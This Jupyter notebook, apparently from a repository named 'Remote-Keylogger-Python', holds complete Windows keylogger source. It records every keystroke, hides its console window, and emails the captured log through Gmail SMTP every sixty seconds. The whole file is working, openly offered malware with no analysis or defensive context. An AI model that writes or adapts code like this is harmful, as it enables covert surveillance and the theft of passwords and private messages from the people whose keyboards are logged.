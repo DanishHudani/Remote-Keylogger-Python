{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import keyboard #for keylogs\n",
    "import smtplib #for sending email using SMTP protocol (gmail)\n",
    "import win32console\n",
    "import ctypes\n",
    "import ssl\n",
    "import win32gui\n",
    "import datetime\n",
    "import os"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from email.mime.text import MIMEText\n",
    "from email.mime.multipart import MIMEMultipart"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from threading import Semaphore, Timer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "email= \"enter your email here\"\n",
    "password= \"enter your password here\"\n",
    "reportPeriod = 60 #in seconds"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "class Keylogger:\n",
    "    def __init__(self, interval):\n",
    "        self.interval = interval\n",
    "        self.log = \"\"\n",
    "        self.semaphore = Semaphore(0)\n",
    "\n",
    "    def callback(self, event):\n",
    "        \n",
    "        name = event.name\n",
    "        if len(name) > 1:\n",
    "           \n",
    "            if name == \"space\":\n",
    "                name = \" \"\n",
    "            elif name == \"enter\":\n",
    "                name = \"[ENTER]\\n\"\n",
    "            elif name == \"decimal\":\n",
    "                name = \".\"\n",
    "            else:\n",
    "                name = f\"[{name.upper()}]\"\n",
    "\n",
    "        self.log += name\n",
    "    \n",
    "    def sendmail(self, email, password, message):\n",
    "\n",
    "        server = smtplib.SMTP(host=\"smtp.gmail.com\", port=587)\n",
    "        server.starttls()\n",
    "        server.login(email, password)\n",
    "\n",
    "        current = str(datetime.datetime.today())\n",
    "        \n",
    "        m = MIMEMultipart(\"alternative\")\n",
    "        m[\"Subject\"] = current\n",
    "        m[\"From\"] = email\n",
    "        m[\"To\"] = email\n",
    "            \n",
    "        text = MIMEText(message)\n",
    "        m.attach(text)\n",
    "\n",
    "        server.sendmail(email, email, m.as_string())\n",
    "        server.quit()\n",
    "\n",
    "    def report(self):\n",
    "        \n",
    "        if self.log:\n",
    "            self.sendmail(email, password, self.log)\n",
    "        self.log = \"\"\n",
    "        Timer(interval=self.interval, function=self.report).start()\n",
    "\n",
    "    def start(self):\n",
    "        keyboard.on_release(callback=self.callback)\n",
    "\n",
    "        self.report()\n",
    "        self.semaphore.acquire()\n",
    "\n",
    "\n",
    "    \n",
    "    def Hide(self):\n",
    "        win = win32console.GetConsoleWindow()\n",
    "        win32gui.ShowWindow(win, 0)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "if __name__ == \"__main__\":\n",
    "    \n",
    "    keylogger = Keylogger(interval=reportPeriod)\n",
    "    \n",
    "    keylogger.Hide()\n",
    "    keylogger.start()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
